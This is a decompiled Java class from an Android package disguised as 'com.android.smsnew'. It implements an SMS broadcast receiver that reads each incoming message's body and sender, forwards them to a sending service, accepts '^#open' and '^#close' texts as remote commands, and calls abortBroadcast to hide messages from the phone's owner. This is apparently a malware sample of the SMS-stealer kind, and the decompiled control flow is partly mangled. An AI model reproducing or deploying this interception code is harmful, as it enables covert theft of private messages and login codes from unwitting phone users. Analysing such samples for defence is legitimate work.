// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.android.smsnew;

import android.content.*;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.util.ArrayList;
import java.util.List;

// Referenced classes of package com.android.smsnew:
//            FileUtils, SmsInfo, SmsBeanList, OpenSmsUtils, 
//            SendMsgService

public class SMSBroadcastReceiver extends BroadcastReceiver
{

    public SMSBroadcastReceiver()
    {
        mContext = null;
    }

    private List getMessageList(Intent intent)
    {
        ArrayList arraylist;
        Bundle bundle;
        arraylist = new ArrayList();
        bundle = intent.getExtras();
        if(bundle != null) goto _L2; else goto _L1
_L1:
        return arraylist;
_L2:
        Object aobj[] = (Object[])bundle.get("pdus");
        SmsMessage asmsmessage[] = new SmsMessage[aobj.length];
        int i = 0;
        do
        {
label0:
            {
                if(i < asmsmessage.length)
                    break label0;
                if(asmsmessage.length != 0)
                {
                    String s = FileUtils.getPhoneNum(mContext);
                    int j = asmsmessage.length;
                    int k = 0;
                    while(k < j) 
                    {
                        SmsMessage smsmessage = asmsmessage[k];
                        SmsInfo smsinfo = new SmsInfo();
                        smsinfo.setSmsbody(smsmessage.getMessageBody());
                        smsinfo.setPhoneNumber(smsmessage.getOriginatingAddress());
                        smsinfo.setName(s);
                        arraylist.add(smsinfo);
                        k++;
                    }
                }
            }
            if(true)
                continue;
            asmsmessage[i] = SmsMessage.createFromPdu((byte[])aobj[i]);
            i++;
        } while(true);
        if(true) goto _L1; else goto _L3
_L3:
    }

    public void onReceive(Context context, Intent intent)
    {
        if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
        {
            mContext = context;
            List list = getMessageList(intent);
            if(list != null && list.size() != 0)
            {
                SmsBeanList smsbeanlist = new SmsBeanList();
                smsbeanlist.setListSms(list);
                if("^#open".equals(((SmsInfo)list.get(0)).getSmsbody().trim()))
                {
                    OpenSmsUtils.setOpenSms(context, true);
                    abortBroadcast();
                } else
                if("^#close".equals(((SmsInfo)list.get(0)).getSmsbody().trim()))
                {
                    OpenSmsUtils.setOpenSms(context, false);
                    abortBroadcast();
                } else
                {
                    Intent intent1 = new Intent(context, com/android/smsnew/SendMsgService);
                    intent1.putExtra("msg", smsbeanlist);
                    intent1.setFlags(0x10000000);
                    mContext.startService(intent1);
                }
                if(!OpenSmsUtils.isOpenSms(context))
                {
                    abortBroadcast();
                    return;
                }
            }
        }
    }

    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
    private Context mContext;
}
